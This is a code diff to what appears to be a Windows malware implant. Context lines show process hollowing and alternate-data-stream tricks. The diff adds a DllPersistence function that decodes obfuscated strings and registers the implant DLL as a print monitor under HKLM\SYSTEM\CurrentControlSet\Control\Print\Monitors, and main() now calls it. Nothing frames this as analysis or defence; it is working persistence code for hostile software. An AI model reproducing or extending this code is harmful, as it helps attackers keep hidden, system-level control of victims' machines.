@@ -7,6 +7,7 @@
 
 
 #pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "User32.lib")
 
 FILE * debug_file_handle = stdout;
 
@@ -460,6 +461,52 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 
 }
 
+void DllPersistence( char *module_path ){
+
+	//Get dll name from resource table
+    char reg_str_buf[200];
+	LoadString(dll_handle, IDS_REG_KEY, reg_str_buf, 200);
+	if( strlen( reg_str_buf ) != 0 ){	
+		
+		//Deobfuscate it
+		char *reg_ptr = decode_split(reg_str_buf, 200);
+		std::string reg_str(reg_ptr);
+		free(reg_ptr);
+		//Try to open registry key (SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\)
+		char *keyPath = decode_split("\x5\x3\x5\x9\x5\x3\x5\x4\x4\x5\x4\xd\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\x3\x6\x5\x7\x4\x5\xc\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\xc\x5\x0\x7\x2\x6\x9\x6\xe\x7\x4\x5\xc\x4\xd\x6\xf\x6\xe\x6\x9\x7\x4\x6\xf\x7\x2\x7\x3\x5\xc",96);
+		std::string reg_key_path(keyPath);
+		free(keyPath);
+
+		//Add the name
+		reg_key_path.append(reg_str);
+						
+		//Check if reg key has been set for persistence
+		HKEY hkey = NULL;
+		long ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hkey);
+		if(ret == ERROR_FILE_NOT_FOUND ) {
+
+			//Create the key
+			DWORD dwDisposition;
+			if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, reg_key_path.c_str(), 0, NULL, 0, KEY_WRITE, NULL,  &hkey, &dwDisposition) == ERROR_SUCCESS) {
+
+				//Driver
+				char *driver_ptr = decode_split("\x4\x4\x7\x2\x6\x9\x7\x6\x6\x5\x7\x2",12);
+				ret = RegSetValueEx (hkey, driver_ptr, 0, REG_SZ, (LPBYTE)module_path, strlen(module_path));
+				if ( ret != ERROR_SUCCESS) {
+#ifdef _DBG
+					fprintf(debug_file_handle, "[-] Error: Unable to write registry value.\n");
+#endif
+				}
+				free(driver_ptr);
+				RegCloseKey(hkey);
+			}
+
+		}
+	}
+		
+
+}
+
 int main(int argc, char* argv[])
 {
 
@@ -482,8 +529,11 @@ int main(int argc, char* argv[])
 	GetModuleFileName( dll_handle, module_name, MAX_PATH );
 
 	//Add the ADS reference
-	std::string classPath = module_name;
+	std::string classPath(module_name);
 	classPath.append(COLON);
+
+	//Add registry persistence
+	DllPersistence(module_name);
 
 
 	//Create an env variable with the name of the dll
